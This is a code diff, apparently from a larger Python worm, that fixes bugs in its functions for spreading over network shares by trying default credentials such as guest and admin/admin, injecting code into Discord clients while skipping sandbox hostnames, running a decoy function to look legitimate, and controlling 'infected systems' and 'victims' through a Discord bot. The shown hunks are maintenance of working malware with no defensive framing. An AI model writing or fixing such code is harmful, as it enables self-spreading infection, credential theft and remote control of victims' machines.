@@ -1898,9 +1898,8 @@ def network_share_spread():
                     session.disconnect()
                     connection.disconnect()
                     
-                    print(f"Debug: Disconnected from \\\\{host}\\{share_name}")
-                    
                 except Exception as e:
+                    print(f"Debug: Failed to access \\\\{host}\\{share_name}: {str(e)}")
                     # Try with common credentials
                     common_creds = [
                         ("guest", ""), ("admin", "admin"), ("user", "user"),
@@ -2375,6 +2374,8 @@ def discord_injection():
         
         if any(safe_name.lower() in current_hostname for safe_name in safe_hostnames):
             return 0  # Return 0 injections for safety
+        
+        injected_count = 0  # Initialize injection counter
         
         injection_code = r"""
 const config = {
@@ -3863,8 +3864,10 @@ async def main():
             
             if not approval_granted:
                 print("Debug: Execution not approved - running fake function and exiting")
-            legitimate_looking_function()
-            return
+                legitimate_looking_function()
+                return
+            else:
+                print("Debug: Execution approved by operator - proceeding with full worm")
         else:
             print("Debug: Execution approved by operator - proceeding with full worm")
         
@@ -4607,6 +4610,7 @@ class DiscordBotControl:
         self.infected_systems = {}  # Store info about infected systems
         self.command_history = []
         self.focused_victim = None  # Currently focused victim for easier commands
+        self.pending_approvals = {}  # Store pending execution approvals
         
         # Initialize Discord bot
         self.bot = discord.Client(intents=discord.Intents.all())
@@ -6855,21 +6859,7 @@ def start_bot_control():
         log_error(e, "Bot Control System Startup")
         print("💥 Bot control system startup failed. Check the error log above for details.")
 
-# Complete the bot initialization try block that was started earlier
-try:
-    bot_control = DiscordBotControl(BOT_TOKEN, CONTROL_CHANNEL_ID, WEBHOOK_URL)
-    print("✅ Discord Bot Control System initialized successfully")
-    
-except Exception as e:
-    log_error(e, "Bot Control System Initialization")
-    print("💥 Failed to initialize bot control system. Some features may not work.")
-    # Create a dummy bot control object to prevent crashes
-    class DummyBotControl:
-        def register_victim(self, *args): return "DUMMY_001"
-        def update_victim_status(self, *args): pass
-        def start_bot(self): print("💥 Dummy bot control - cannot start")
-    
-    bot_control = DummyBotControl()
+# Bot control system is already initialized above
 
 if __name__ == "__main__":
     import sys
